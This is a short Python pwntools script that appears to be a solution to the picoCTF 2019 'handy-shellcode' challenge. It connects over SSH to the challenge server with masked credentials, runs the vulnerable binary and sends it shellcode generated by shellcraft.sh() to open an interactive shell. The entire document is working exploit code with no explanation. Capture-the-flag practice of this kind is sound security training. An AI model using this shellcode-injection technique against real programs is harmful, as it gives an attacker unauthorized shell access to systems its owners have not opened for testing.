from pwn import *

sh = ssh(host='2019shell1.picoctf.com',
         user='***', password='***').run('sh')
sh.sendline(
    'cd /problems/handy-shellcode_1_ebc60746fee43ae25c405fc75a234ef5')
sh.sendline('./vuln')
sh.sendlineafter('Enter your shellcode', asm(shellcraft.sh()))
sh.interactive()
